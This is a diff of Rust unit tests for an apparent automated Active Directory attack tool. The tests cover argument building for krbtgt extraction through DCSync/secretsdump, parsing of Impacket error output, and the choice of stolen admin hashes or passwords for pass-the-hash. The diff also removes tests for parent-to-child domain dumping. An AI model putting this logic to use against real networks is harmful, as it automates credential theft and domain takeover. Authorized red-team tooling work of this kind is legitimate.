+    fn build_krbtgt_extraction_args_full_dump_omits_just_dc_user() {
+        // `None` => omit `-just-dc-user` entirely (full NTDS dump retry).
+        let auth = KrbtgtAuth::Password("Pw".into());
+        let args =
+            build_krbtgt_extraction_args("192.168.58.20", "contoso.local", "alice", &auth, None);
+        assert!(args.get("just_dc_user").is_none());
+        assert_eq!(args["password"], "Pw");
+    }
+
+    #[test]
+    fn krbtgt_just_dc_user_qualifies_when_netbios_known() {
+        assert_eq!(krbtgt_just_dc_user(Some("child")), "CHILD/krbtgt");
+        assert_eq!(krbtgt_just_dc_user(Some("FABRIKAM")), "FABRIKAM/krbtgt");
+    }
+
+    #[test]
+    fn krbtgt_just_dc_user_bare_when_unknown() {
+        assert_eq!(krbtgt_just_dc_user(None), "krbtgt");
+        assert_eq!(krbtgt_just_dc_user(Some("")), "krbtgt");
+        assert_eq!(krbtgt_just_dc_user(Some("   ")), "krbtgt");
+    }
+
+    #[test]
+    fn is_name_not_unique_detects_impacket_error() {
+        let output = "[-] ERROR_DS_NAME_ERROR_NOT_UNIQUE: Name translation: Input name \
+            mapped to more than one output name.";
+        assert!(is_name_not_unique(output));
+    }
+
+    #[test]
+    fn is_name_not_unique_ignores_other_output() {
+        assert!(!is_name_not_unique("STATUS_LOGON_FAILURE"));
+        assert!(!is_name_not_unique(""));
+    }
+
+    #[test]
+    fn is_dcsync_access_denied_detects_rpc_and_dra() {
+        assert!(is_dcsync_access_denied(
+            "[-] DRSR SessionError: code: 0x5 - RPC_S_ACCESS_DENIED"
+        ));
+        assert!(is_dcsync_access_denied(
+            "[-] ERROR_DS_DRA_ACCESS_DENIED while replicating"
+        ));
+    }
+
+    #[test]
+    fn is_dcsync_access_denied_ignores_logon_failure() {
+        assert!(!is_dcsync_access_denied("STATUS_LOGON_FAILURE"));
+        assert!(!is_dcsync_access_denied(""));
+    }
+
+    #[test]
+    fn classify_krbtgt_result_success_beats_everything() {
+        let discoveries = json!({
+            "hashes": [{
+                "username": "krbtgt",
+                "domain": "contoso.local",
+                "hash_type": "ntlm",
+                "hash_value": "lm:nt"
+            }]
+        });
+        // Even with a NOT_UNIQUE warning in the text, a parsed krbtgt wins.
+        let class = classify_krbtgt_result(
+            Some(&discoveries),
+            "ERROR_DS_NAME_ERROR_NOT_UNIQUE",
+            "contoso.local",
+        );
+        assert_eq!(class, DumpClass::Success);
+    }
+
+    #[test]
+    fn classify_krbtgt_result_name_not_unique_before_rejection() {
+        // NOT_UNIQUE is a retry signal and must not be read as a broken
+        // principal even if some rejection-ish token also appears.
+        let class = classify_krbtgt_result(None, "ERROR_DS_NAME_ERROR_NOT_UNIQUE", "contoso.local");
+        assert_eq!(class, DumpClass::NameNotUnique);
+    }
+
+    #[test]
+    fn classify_krbtgt_result_logon_failure_is_rejected() {
+        let class = classify_krbtgt_result(None, "STATUS_LOGON_FAILURE", "contoso.local");
+        assert_eq!(class, DumpClass::AuthRejected);
+    }
+
+    #[test]
+    fn classify_krbtgt_result_access_denied_is_rejected() {
+        let class = classify_krbtgt_result(None, "RPC_S_ACCESS_DENIED", "contoso.local");
+        assert_eq!(class, DumpClass::AuthRejected);
+    }
+
+    #[test]
+    fn classify_krbtgt_result_unknown_is_transient() {
+        let class = classify_krbtgt_result(None, "Connection reset by peer", "contoso.local");
+        assert_eq!(class, DumpClass::Transient);
+    }
+
+    #[test]
+    fn krbtgt_principal_attempt_key_scopes_by_principal() {
+        assert_eq!(
+            krbtgt_principal_attempt_key("192.168.58.20", "CONTOSO.LOCAL", "Alice"),
+            "192.168.58.20:contoso.local:krbtgt_extract_principal:alice"
+        );
+    }
+
+    #[test]
+    fn is_logon_failure_detects_status_logon_failure() {
+        let output = "Impacket v0.13.0.dev0 - Copyright Fortra, LLC\n\n\
+            [-] RemoteOperations failed: SMB SessionError: code: 0xc000006d - \
+            STATUS_LOGON_FAILURE - The attempted logon is invalid.\n[*] Cleaning up...\n";
+        assert!(is_logon_failure(output));
+    }
+
+    #[test]
+    fn is_logon_failure_detects_kerberos_preauth() {
+        assert!(is_logon_failure("KDC_ERR_PREAUTH_FAILED"));
+    }
+
+    #[test]
+    fn is_logon_failure_ignores_generic_failure_text() {
+        assert!(!is_logon_failure(
+            "[-] RemoteOperations failed: Connection reset by peer"
+        ));
+    }
+
+    #[test]
+    fn is_logon_failure_ignores_empty_output() {
+        assert!(!is_logon_failure(""));
+    }
+
+    #[test]
+    fn select_krbtgt_candidates_prefers_hash_then_password() {
+        let mut s = StateInner::new("op".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
+        let mut alice = make_cred("alice", "Pw", "contoso.local");
+        alice.is_admin = true;
+        s.credentials.push(alice);
+        let candidates = select_krbtgt_candidates(&s, "contoso.local");
+        assert_eq!(candidates.len(), 2);
+        assert_eq!(candidates[0].0, "Administrator");
+        assert!(matches!(candidates[0].1, KrbtgtAuth::Hash(ref h) if h == "deadbeef"));
+        assert_eq!(candidates[1].0, "alice");
+        assert!(matches!(candidates[1].1, KrbtgtAuth::Password(ref p) if p == "Pw"));
+    }
+
+    #[test]
+    fn select_krbtgt_candidates_dedups_hash_and_password_for_same_user() {
+        let mut s = StateInner::new("op".into());
+        let mut h = make_admin_ntlm_hash("contoso.local", "deadbeef");
+        h.username = "alice".into();
+        s.hashes.push(h);
+        s.credentials
+            .push(make_cred("alice", "Pw", "contoso.local"));
+        let candidates = select_krbtgt_candidates(&s, "contoso.local");
+        assert_eq!(candidates.len(), 1);
+        assert_eq!(candidates[0].0, "alice");
+        assert!(matches!(candidates[0].1, KrbtgtAuth::Hash(_)));
+    }
+
+    #[test]
+    fn select_krbtgt_candidates_skips_quarantined_and_delegation() {
+        let mut s = StateInner::new("op".into());
+        s.credentials
+            .push(make_cred("alice", "Pw", "contoso.local"));
+        s.quarantine_principal("alice", "contoso.local");
+        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
+    }
+
+    #[test]
+    fn select_krbtgt_candidates_skips_wrong_domain() {
+        let mut s = StateInner::new("op".into());
+        s.hashes
+            .push(make_admin_ntlm_hash("fabrikam.local", "deadbeef"));
+        s.credentials
+            .push(make_cred("alice", "Pw", "fabrikam.local"));
+        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
+    }
+
+    #[test]
+    fn select_krbtgt_candidates_skips_empty_password() {
+        let mut s = StateInner::new("op".into());
+        s.credentials.push(make_cred("alice", "", "contoso.local"));
+        assert!(select_krbtgt_candidates(&s, "contoso.local").is_empty());
     }
 
     #[test]
@@ -1057,120 +1373,5 @@ mod tests {
         s.domain_controllers
             .insert("fabrikam.local".into(), "192.168.58.40".into());
         assert!(select_pth_secretsdump_work(&s).is_empty());
-    }
-
-    // --- select_parent_to_child_secretsdump_work ------------------------
-
-    #[test]
-    fn select_p2c_emits_when_parent_dominated_and_child_dc_known() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        let work = select_parent_to_child_secretsdump_work(&s);
-        assert_eq!(work.len(), 1);
-        // (dedup_key, child_dc_ip, parent_domain, hash, child_domain_lc)
-        assert_eq!(work[0].1, "192.168.58.11");
-        assert_eq!(work[0].2, "contoso.local");
-        assert_eq!(work[0].3, "deadbeef");
-        assert_eq!(work[0].4, "child.contoso.local");
-    }
-
-    #[test]
-    fn select_p2c_returns_empty_when_no_dominated_parent() {
-        let mut s = StateInner::new("op".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_when_child_already_dominated() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        s.dominated_domains.insert("child.contoso.local".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_when_no_parent_admin_hash() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        // No Administrator NTLM hash for contoso.local → skip.
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_non_ntlm_parent_hash() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        let mut h = make_admin_ntlm_hash("contoso.local", "deadbeef");
-        h.hash_type = "AES256".into();
-        s.hashes.push(h);
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_unrelated_dc() {
-        // dominated forest root has no child DCs in the state — fabrikam is
-        // a separate forest, not a child of contoso.
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("fabrikam.local".into(), "192.168.58.40".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_parent_dc_itself() {
-        // The parent's own DC must not appear as a child target — `is_child_of`
-        // requires strict suffix, so contoso.local does not satisfy
-        // contoso.local.ends_with(".contoso.local").
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn select_p2c_skips_already_processed() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("contoso.local".into());
-        s.hashes
-            .push(make_admin_ntlm_hash("contoso.local", "deadbeef"));
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.mark_processed(
-            DEDUP_SECRETSDUMP,
-            parent_to_child_pth_dedup_key("192.168.58.11", "child.contoso.local"),
-        );
-        assert!(select_parent_to_child_secretsdump_work(&s).is_empty());
-    }
-
-    #[test]
-    fn p2c_dedup_key_distinct_from_pth_key() {
-        // The two directions must use different namespaces so they don't
-        // shadow each other when the same (ip, domain) pair appears in both
-        // work lists.
-        let a = pth_secretsdump_dedup_key("192.168.58.11", "child.contoso.local");
-        let b = parent_to_child_pth_dedup_key("192.168.58.11", "child.contoso.local");
-        assert_ne!(a, b);
     }
 }
